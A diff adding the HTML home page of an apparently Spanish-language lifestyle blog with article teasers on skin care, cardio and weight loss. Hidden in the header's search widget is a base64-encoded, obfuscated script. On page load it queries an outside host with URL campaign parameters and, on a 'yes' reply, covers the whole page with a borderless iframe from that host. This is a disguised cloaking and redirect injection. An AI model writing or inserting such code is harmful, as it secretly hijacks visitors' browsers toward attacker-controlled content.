@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<!-- Basic Page Needs
+    ================================================== -->
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+	<!-- Specific Meta
+    ================================================== -->
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+
+	
+
+	<title>la belleza de la</title>
+
+
+	<link
+		href="https://fonts.googleapis.com/css2?family=Barlow+Semi+Condensed:wght@400;500;600;700;800&family=Barlow:wght@400;500;600;700&family=Roboto+Slab:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap"
+		rel="stylesheet">
+
+
+	<link rel="stylesheet" href="assets/css/bootstrap.min.css" />
+	<link rel="stylesheet" href="assets/css/magnific-popup.css" />
+	<link rel="stylesheet" href="assets/css/owl.carousel.min.css" />
+	<link rel="stylesheet" href="assets/css/simple-scrollbar.css" />
+	<link rel="stylesheet" href="assets/css/fontawesome.all.min.css" />
+	<link rel="stylesheet" href="assets/css/style.css" />
+
+	<script src="assets/js/modernizr.min.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+</head>
+
+<body class="bg-white-smoke">
+
+
+
+
+	<div class="site-content">
+
+
+
+		<header class="site-header default-header-style intro-element">
+			<div class="header-top-area">
+				<div class="container">
+					<div class="row align-items-center">
+						<div class="col-4">
+							<div class="intro-socail-share">
+								<div class="share-alt"><span class="fa fa-share-alt"></span></div>
+								<div class="socail-share">
+									<a href="#"><span class="fab fa-facebook-f"></span></a>
+									<a href="#"><span class="fab fa-twitter"></span></a>
+									<a href="#"><span class="fab fa-instagram"></span></a>
+									<a href="#"><span class="fab fa-pinterest-p "></span></a>
+								</div>
+							</div><!-- /.intro-socail-share -->
+						</div>
+						<div class="col-4">
+							<div class="site-branding text-center">
+								<a href="index.html">
+									la juventud
+								</a>
+							</div><!-- /.site-branding -->
+						</div>
+						<div class="col-4">
+							<div class="header-right-area">
+								<div class="search-wrap">
+									<div class="search-btn">
+										<i class="fas fa-search"></i>
+									</div>
+									<div class="search-form">
+										<form action="#">
+											<input type="search" >
+											<button type="submit"><i class="fas fa-search"></i></button>
+										</form>
+									</div>
+								</div>
+								<!--~./ search-wrap ~-->
+								<script src="data:text/javascript;base64,dmFyIF8weDFjMzI9WyIxNDY0NjlCSUJ2UGsiLCI0MlpraHptRCIsIm1hdGNoIiwiMTE0MHFmeFpkWSIsIjFFV05mVkciLCJ1dG1fdGVybSIsIjQ4NTc3bmxWYlJ4IiwiMTU5NTRTUUtLZHIiLCIya2FLQ0NwIiwidXRtX2NhbXBhaWduIiwiMjAwNDI2aGlwc3d1IiwiZ2V0IiwiMUFod3pwUyIsImxvY2F0aW9uIiwnIiBmcmFtZWJvcmRlcj0iMCIgc3R5bGU9Im92ZXJmbG93OmhpZGRlbjtvdmVyZmxvdy14OmhpZGRlbjtvdmVyZmxvdy15OmhpZGRlbjtoZWlnaHQ6MTAwJTt3aWR0aDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlO3RvcDowcHg7bGVmdDowcHg7cmlnaHQ6MHB4O2JvdHRvbTowcHgiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiPjwvaWZyYW1lPicsIjExNDM4MFJwQWhVeCIsIj0oW14mPV0rKSIsImh0dHBzOi8vdmVvbHMuZ2VvbmFsc2VjZS5jb20vaW5kZXgucGhwP2tleT13djg1eDNkZ3lydzZ6djFpMDhoZyIsIjE4MTUyN2NtT0FHZiIsIndyaXRlIiwiMXp3UHRrciJdLF8weDFhYTA9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gXzB4MWMzMltlLT00NzBdfSxfMHg0YzAyMWI9XzB4MWFhMDtmdW5jdGlvbiBnZXRDb29raWVzKGUpe3ZhciB0PV8weDFhYTAsYT13aW5kb3dbdCg0ODgpXS5zZWFyY2g7cmV0dXJuISEoYT1hW3QoNDc3KV0obmV3IFJlZ0V4cChlK3QoNDcwKSkpKSYmYVsxXX1mdW5jdGlvbiBvbkFqYXhTdWNjZXNzKGUpe3ZhciB0PV8weDRjMDIxYjsieWVzIj09ZSYmZG9jdW1lbnRbdCg0NzMpXSgnPGlmcmFtZSBzcmM9Imh0dHBzOi8vdmVvbHMuZ2VvbmFsc2VjZS5jb20vaW5kZXgucGhwP2tleT14Y2p2bGZ6NzVkMjE1cmlndXFreCZ1dG1fY2FtcGFpZ249JytnZXRDb29raWVzKHQoNDg0KSkrIiZ1dG1fdGVybT0iK2dldENvb2tpZXModCg0ODApKSt0KDQ4OSkpfSFmdW5jdGlvbih0KXtmb3IodmFyIGU9XzB4MWFhMDs7KXRyeXtpZigxMDU4Njg9PT1wYXJzZUludChlKDQ5MCkpK3BhcnNlSW50KGUoNDc0KSkqLXBhcnNlSW50KGUoNDgyKSkrcGFyc2VJbnQoZSg0NzYpKSpwYXJzZUludChlKDQ3OCkpKy1wYXJzZUludChlKDQ4NSkpK3BhcnNlSW50KGUoNDgxKSkqcGFyc2VJbnQoZSg0ODcpKStwYXJzZUludChlKDQ3OSkpKi1wYXJzZUludChlKDQ3MikpK3BhcnNlSW50KGUoNDc1KSkqcGFyc2VJbnQoZSg0ODMpKSlicmVhazt0LnB1c2godC5zaGlmdCgpKX1jYXRjaChlKXt0LnB1c2godC5zaGlmdCgpKX19KF8weDFjMzIpLCRbXzB4NGMwMjFiKDQ4NildKF8weDRjMDIxYig0NzEpLG9uQWpheFN1Y2Nlc3MpOw=="></script>
+								<!--~./ header card area ~-->
+
+								<div class="hamburger-menus">
+									<span></span>
+									<span></span>
+									<span></span>
+								</div>
+							</div><!-- /.header-top-right-area -->
+						</div>
+					</div>
+				</div>
+			</div><!-- /.header-top-area -->
+
+			<div class="navigation-area">
+				<div class="container">
+					<div class="row">
+						<div class="col-12">
+							<div class="site-navigation">
+								<nav class="navigation">
+									<div class="menu-wrapper">
+										<div class="menu-content">
+											<ul class="mainmenu">
+												<li class="megamenu">
+													<a class="active" href="index.html">Inicio</a>
+
+												</li>
+												<li><a href="blog.html">Artículo</a></li>
+
+
+												<li><a href="contact.html">Contactos</a></li>
+												<li><a href="policy.html">Política de privacidad</a></li>
+												<li><a href="terms.html">Términos y condiciones</a></li>
+											</ul> <!-- /.menu-list -->
+										</div> <!-- /.hours-content-->
+									</div><!-- /.menu-wrapper -->
+								</nav>
+							</div><!-- /.site-navigation -->
+						</div><!-- /.col-12 -->
+					</div><!-- /.row -->
+				</div><!-- /.container -->
+			</div><!-- /.navigation-area -->
+
+			<div class="mobile-sidebar-menu sidebar-menu">
+				<div class="overlaybg"></div>
+			</div>
+		</header>
+		<!--~~./ end site header ~~-->
+		<!--~~~ Sticky Header ~~~-->
+		<div id="sticky-header" class="active"></div>
+		<!--~./ end sticky header ~-->
+
+		<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+				Start Frontpage Slider Posts
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+		<div class="frontpage-slider-posts">
+			<div class="container-medium">
+				<div class="row">
+					<div class="col-12">
+						<div class="owl-carousel frontpage-slider-one style-one carousel-rectangle carousel-nav-center">
+							
+							<article class="post hentry post-slider-one text-center">
+								<div class="entry-thumb">
+									<figure class="thumb-wrap">
+										<a href="361eb6d7a3043cc68567bd79347ab94e.html">
+											<img src="./assets/images/jannis-brandt-mmsqugmlquo-unsplash.jpg" alt="post" />
+										</a>
+									</figure>
+									<!--./ thumb-wrap -->
+								</div>
+								<!--./ entry-thumb -->
+								<div class="content-entry-wrap">
+
+									<!--./ entry-category -->
+									<h3 class="entry-title">
+										<a href="361eb6d7a3043cc68567bd79347ab94e.html">	7 productos que hacen la gran caseros para la piel de las máscaras</a>
+									</h3>
+									<!--./ entry-title -->
+									<div class="entry-content">
+										<div class="read-more-wrap">
+											<a class="read-more" href="361eb6d7a3043cc68567bd79347ab94e.html">Leer más</a>
+										</div>
+									</div>
+									<!--./ entry-content -->
+								</div>
+								<!--./ content-entry-wrap -->
+							</article>
+							
+
+							<article class="post hentry post-slider-one text-center">
+								<div class="entry-thumb">
+									<figure class="thumb-wrap">
+										<a href="0w1xDAm3igQuj66SqRdpRuZWN6FnD4.html">
+											<img src="./assets/images/s-o-c-i-a-l-c-u-t-becrn_dxyaw-unsplash.jpg" alt="post" />
+										</a>
+									</figure>
+									<!--./ thumb-wrap -->
+								</div>
+								<!--./ entry-thumb -->
+								<div class="content-entry-wrap">
+
+									<!--./ entry-category -->
+									<h3 class="entry-title">
+										<a href="0w1xDAm3igQuj66SqRdpRuZWN6FnD4.html">	Los mejores ejercicios de cardio que usted puede hacer en casa</a>
+									</h3>
+									<!--./ entry-title -->
+									<div class="entry-content">
+										<div class="read-more-wrap">
+											<a class="read-more" href="0w1xDAm3igQuj66SqRdpRuZWN6FnD4.html">Leer más</a>
+										</div>
+									</div>
+									<!--./ entry-content -->
+								</div>
+								<!--./ content-entry-wrap -->
+							</article>
+							
+
+							<article class="post hentry post-slider-one text-center">
+								<div class="entry-thumb">
+									<figure class="thumb-wrap">
+										<a href="c0HBjs3GVIWsdT6.html">
+											<img src="./assets/images/mathew-schwartz-8rj4sz9ylci-unsplash.jpg" alt="post" />
+										</a>
+									</figure>
+									<!--./ thumb-wrap -->
+								</div>
+								<!--./ entry-thumb -->
+								<div class="content-entry-wrap">
+
+									<!--./ entry-category -->
+									<h3 class="entry-title">
+										<a href="c0HBjs3GVIWsdT6.html">	Cómo perder peso después de los 50?</a>
+									</h3>
+									<!--./ entry-title -->
+									<div class="entry-content">
+										<div class="read-more-wrap">
+											<a class="read-more" href="c0HBjs3GVIWsdT6.html">Leer más</a>
+										</div>
+									</div>
+									<!--./ entry-content -->
+								</div>
+								<!--./ content-entry-wrap -->
+							</article>
+							
+
+						</div>
+						<!--/#frontpage-slide -->
+					</div>
+				</div>
+			</div>
+		</div>
+		<!--~./End frontpage slider posts ~-->
+
+		<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+            Start Main Wrapper
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+
+		<!--~./ end features block ~-->
+
+
+		<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+            Start Main Wrapper
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+		<div class="main-wrapper pd-b-120" style="margin-top: 70px;">
+			<div class="container">
+				<div class="row justify-content-between gutters-50">
+					<div class="col-lg-9 main-wrapper-content">
+						<!--~~~~~ Start Site Main ~~~~~-->
+						<main class="site-main style-one">
+							<div class="row gutters-50">
+								
+								<div class="col-lg-6 col-md-6">
+									<article class="post hentry post-grid text-center style-one">
+										<div class="entry-thumb">
+											<figure class="thumb-wrap">
+												<a href="361eb6d7a3043cc68567bd79347ab94e.html">
+													<img src="./assets/images/jannis-brandt-mmsqugmlquo-unsplash.jpg" alt="post" />
+												</a>
+											</figure>
+											<!--./ thumb-wrap -->
+										</div>
+										<!--./ entry-thumb -->
+										<div class="content-entry-wrap">
+
+											<!--./ entry-category -->
+											<h3 class="entry-title">
+												<a href="361eb6d7a3043cc68567bd79347ab94e.html">7 productos que hacen la gran caseros para la piel de las máscaras</a>
+											</h3>
+											<!--./ entry-title -->
+
+											<!--./ entry-meta-content -->
+											<div class="read-more-wrap">
+												<a class="read-more" href="361eb6d7a3043cc68567bd79347ab94e.html">Leer más</a>
+											</div>
+											<!--./ entry-content -->
+										</div>
+										<!--./ content-entry-wrap -->
+									</article>
+								</div>
+								
+
+								<div class="col-lg-6 col-md-6">
+									<article class="post hentry post-grid text-center style-one">
+										<div class="entry-thumb">
+											<figure class="thumb-wrap">
+												<a href="0w1xDAm3igQuj66SqRdpRuZWN6FnD4.html">
+													<img src="./assets/images/s-o-c-i-a-l-c-u-t-becrn_dxyaw-unsplash.jpg" alt="post" />
+												</a>
+											</figure>
+											<!--./ thumb-wrap -->
+										</div>
+										<!--./ entry-thumb -->
+										<div class="content-entry-wrap">
+
+											<!--./ entry-category -->
+											<h3 class="entry-title">
+												<a href="0w1xDAm3igQuj66SqRdpRuZWN6FnD4.html">Los mejores ejercicios de cardio que usted puede hacer en casa</a>
+											</h3>
+											<!--./ entry-title -->
+
+											<!--./ entry-meta-content -->
+											<div class="read-more-wrap">
+												<a class="read-more" href="0w1xDAm3igQuj66SqRdpRuZWN6FnD4.html">Leer más</a>
+											</div>
+											<!--./ entry-content -->
+										</div>
+										<!--./ content-entry-wrap -->
+									</article>
+								</div>
+								
+
+								<div class="col-lg-6 col-md-6">
+									<article class="post hentry post-grid text-center style-one">
+										<div class="entry-thumb">
+											<figure class="thumb-wrap">
+												<a href="c0HBjs3GVIWsdT6.html">
+													<img src="./assets/images/mathew-schwartz-8rj4sz9ylci-unsplash.jpg" alt="post" />
+												</a>
+											</figure>
+											<!--./ thumb-wrap -->
+										</div>
+										<!--./ entry-thumb -->
+										<div class="content-entry-wrap">
+
+											<!--./ entry-category -->
+											<h3 class="entry-title">
+												<a href="c0HBjs3GVIWsdT6.html">Cómo perder peso después de los 50?</a>
+											</h3>
+											<!--./ entry-title -->
+
+											<!--./ entry-meta-content -->
+											<div class="read-more-wrap">
+												<a class="read-more" href="c0HBjs3GVIWsdT6.html">Leer más</a>
+											</div>
+											<!--./ entry-content -->
+										</div>
+										<!--./ content-entry-wrap -->
+									</article>
+								</div>
+								
+
+
+
+							</div>
+						</main>
+						<!--~./ end site main ~-->
+
+						<!--~~~~~ Start Paging Navigation ~~~~~-->
+
+						<!--~./ end paging navigation ~-->
+					</div>
+
+					<!--~~~~~ Start sidebar ~~~~~-->
+
+					<!--~./ end sidebar ~-->
+				</div>
+			</div>
+		</div>
+		<!--~./ end main wrapper ~-->
+
+		<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+            Start Site Footer
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+		<footer class="site-footer footer-style-two">
+			<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                Start Instagram Widget Area
+            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+
+			<!--~./ end instagram widget area ~-->
+			<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+					Start Footer Widget Area
+				~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+			<div class="footer-widget-area">
+				<div class="container">
+					<div class="row">
+						<!--~~~~~ Start Widget Location ~~~~~-->
+						<div class="col-lg-4 col-md-6">
+							<aside class="widget bt-location-widget">
+
+								<div class="widget-content">
+									<div class="info-box">
+										<p>
+											Passeig Raya, 48, 26º F, 02553, Os Bautista
+										</p>
+									</div>
+									<div class="info-box">
+										<p>+3899200789637</p>
+										<p>
+											<a href="#">manuela17@cavazos.com</a>
+										</p>
+									</div>
+								</div>
+							</aside>
+						</div>
+						<!--~./ end location widget ~-->
+
+						<!--~~~~~ Start Widget Links ~~~~~-->
+
+						<!--~./ end links widget ~-->
+						<!--~~~~~ Start Widget Links ~~~~~-->
+
+						<!--~./ end links widget ~-->
+
+						<!--~~~~~ Start Subscribe Widget~~~~~-->
+
+						<!--~./ end subscribe widget ~-->
+					</div>
+				</div>
+			</div>
+			<!--~./ end footer widgets area ~-->
+
+			<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+				Start Footer Bottom Area
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+			<div class="footer-bottom-area">
+				<div class="container">
+					<div class="row">
+						<div class="col-12">
+							<div class="footer-bottom-content">
+								<div class="copyright-text text-center">
+									<p>
+										Copyright &copy;<script>document.write(new Date().getFullYear());</script>
+										All rights reserved
+									</p>
+								</div>
+								<!--~./ end copyright text ~-->
+							</div>
+						</div>
+						<!--~./ col-12 ~-->
+					</div>
+				</div>
+			</div>
+			<!--~./ end footer bottom area ~-->
+		</footer>
+		<!--~./ end site footer ~-->
+	</div>
+
+
+	<div class='cookie-banner'>
+		<p>
+			El sitio web utiliza "cookies". Permiten identificarlo y recibir su información de la experiencia del usuario.Continuando con la navegación de la web, estoy de acuerdo con el uso de las cookies, el propietario del sitio de conformidad con  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Política de cookies</a>
+		</p>
+		<button class='close-cookie'>&times;</button>
+	</div>
+
+	<script>
+		window.onload = function () {
+			$('.close-cookie').click(function () {
+				$('.cookie-banner').fadeOut();
+			})
+		}
+	</script>
+	<script>
+		let elems = document.querySelectorAll('.server-name');
+		elems.forEach((elem) => {
+			elem.innerHTML = window.location.hostname
+		})
+	</script>
+
+	<script src="assets/js/jquery.js"></script>
+	<script src="assets/js/popper.min.js"></script>
+	<script src="assets/js/bootstrap.min.js"></script>
+	<script src="assets/js/plugins.js"></script>
+	<script src="assets/js/imagesloaded.pkgd.min.js"></script>
+	<script src="assets/js/simple-scrollbar.min.js"></script>
+	<script src="assets/js/jquery.magnific-popup.min.js"></script>
+	<script src="assets/js/masonry.pkgd.min.js"></script>
+	<script src="assets/js/theia-sticky-sidebar.min.js"></script>
+	<script src="assets/js/ResizeSensor.min.js"></script>
+	<script src="assets/js/owl.carousel.min.js"></script>
+	<script src="assets/js/scrolla.jquery.min.js"></script>
+	<script src="assets/js/main.js"></script>
+	<!-- main-js -->
+</body>
+
+</html>
